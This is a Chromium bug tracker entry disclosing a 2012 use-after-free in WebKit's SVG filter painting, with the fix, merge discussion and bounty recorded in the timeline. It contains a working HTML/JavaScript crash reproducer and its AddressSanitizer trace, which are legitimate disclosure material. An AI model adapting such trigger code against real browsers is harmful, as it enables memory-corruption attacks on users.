# Security: use-after-free in WebCore::GraphicsContext::paintingDisabled

| Field | Value |
|-------|-------|
| **Issue ID** | [40076459](https://issues.chromium.org/issues/40076459) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink, Blink>SVG |
| **Reporter** | mi...@gmail.com |
| **Assignee** | sc...@chromium.org |
| **Created** | 2012-10-18 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

use-after-free in WebCore::GraphicsContext::paintingDisabled

**VERSION**  

Chrome Version: dev

Chromium 24.0.1301.0 (Developer Build 162597)  

OS Linux  

WebKit 537.16 (@131643)  

JavaScript V8 3.14.4.1

causes infinite recursion in older versions (prior to the other svg bugfix)

Operating System: 64bit ubuntu precise

**REPRODUCTION CASE**

<html>
<head>
<script>
onload = function() {
el0=document.createElementNS('http://www.w3.org/2000/svg', 'svg')
el0.setAttribute('id','el0')
document.body.appendChild(el0)
el1=document.createElementNS('http://www.w3.org/2000/svg', 'g')
el1.setAttribute('filter', 'url(#el2)')
el0.appendChild(el1)
el2=document.createElementNS('http://www.w3.org/2000/svg', 'filter')
el2.setAttribute('id','el2')
el0.appendChild(el2)
el3=document.createElementNS('http://www.w3.org/2000/svg', 'feImage')
el3.setAttributeNS('http://www.w3.org/1999/xlink', 'xlink:href', '#el0')
el2.appendChild(el3)
document.body.offsetTop
el0.setAttribute('filter', 'url(#el2)')
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab + asan  

Crash State:

==7986== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffebb2beec at pc 0x55555a030bba bp 0x7fffffff4780 sp 0x7fffffff4778  

READ of size 1 at 0x7fffebb2beec thread T0  

#0 0x55555a030bb9 in WebCore::GraphicsContext::paintingDisabled() const ???:0  

#1 0x55555a0abaf2 in WebCore::GraphicsContext::concatCTM(WebCore::AffineTransform const&) ???:0  

#2 0x55555c30a2f9 in WebCore::RenderSVGResourceFilter::postApplyResource(WebCore::RenderObject\*, WebCore::GraphicsContext\*&, unsigned short, WebCore::Path const\*, WebCore::RenderSVGShape const\*) ???:0

0x7fffebb2beec is located 108 bytes inside of 144-byte region [0x7fffebb2be80,0x7fffebb2bf10)  

freed by thread T0 here:  

#0 0x55555f967df0 in \_\_interceptor\_free ??:0  

#1 0x55555a0b2a95 in WebCore::ImageBuffer::~ImageBuffer() ???:0  

#2 0x55555c307e20 in WebCore::RenderSVGResourceFilter::applyResource(WebCore::RenderObject\*, WebCore::RenderStyle\*, WebCore::GraphicsContext\*&, unsigned short) ???:0  

#3 0x55555c04d9dc in WebCore::SVGRenderingContext::prepareToRenderSVGContent(WebCore::RenderObject\*, WebCore::PaintInfo&, WebCore::SVGRenderingContext::NeedsGraphicsContextSave) ???:0

## Attachments

- [svg3.html](attachments/svg3.html) (text/html; charset=us-ascii, 826 B)
- [svg3.txt](attachments/svg3.txt) (text/x-c; charset=us-ascii, 19.3 KB)

## Timeline

### in...@chromium.org (2012-10-18)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-10-18)

[Empty comment from Monorail migration]

### sc...@chromium.org (2012-10-22)

[Empty comment from Monorail migration]

### sc...@chromium.org (2012-10-30)

Apparently BugDroid failed to pick up that this was fixed in WebKit r132856: <http://trac.webkit.org/changeset/132856>.

Merge requested for m23. Reward?

### sc...@chromium.org (2012-10-30)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-10-30)

I don't think it will make to m23 stable (needs bake time on trunk), but m23 stable first patch.

### sc...@gmail.com (2012-10-30)

[Empty comment from Monorail migration]

### sc...@chromium.org (2012-10-30)

Sorry, I interpret Abhishek's comment to mean don't merge, but the MergeApproved flag is set. Please clarify. :-)

And the Chromium Notifier just IMed me. also apparently upset.

### ka...@google.com (2012-10-30)

please don't merge just now. i'm still in the process of getting a good build. if i read abishek's comment right he's saying we'll take it for stable 2. i will give you heads up as soon as it's ok to merge. chris/abishek, is that ok?

(setting back to requested to i don't lose it.)

### sc...@gmail.com (2012-10-30)

Hey Karen, generally, "Merge-Approved" still means we'll wait for you to say it's ok. Security merges are tackled pretty much by myself or Abhishek and we do not fire them off indiscriminately :P

### in...@chromium.org (2012-10-30)

Answer to first question: Security bugs have blanket merge approval, we use the flag to keep track of which bugs to merge. But we do the actual merge when the merge window opens (and after letting it bake and checking with the RM)

Answer to second question: ignore that, we need to get that fixed. known issue.

Overall conclusion: Keep fixing awesome bugs, leave the merges to the security team :)

I have talked to Karen and told that we are not merging this to branch right now, but for the next m23 patch.

### sc...@gmail.com (2012-11-12)

$1000 for miaubiz!

### sc...@gmail.com (2012-11-12)

M23: http://trac.webkit.org/changeset/134258

### sc...@gmail.com (2012-11-12)

M24: http://trac.webkit.org/changeset/134267

### sc...@gmail.com (2012-11-26)

https://bugs.webkit.org/show_bug.cgi?id=94652

### sc...@gmail.com (2012-12-14)

Payment in system as part of $3000 batch.

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-05)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/156567?no_tracker_redirect=1

[Multiple monorail components: Blink, Blink>SVG]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40076459)*
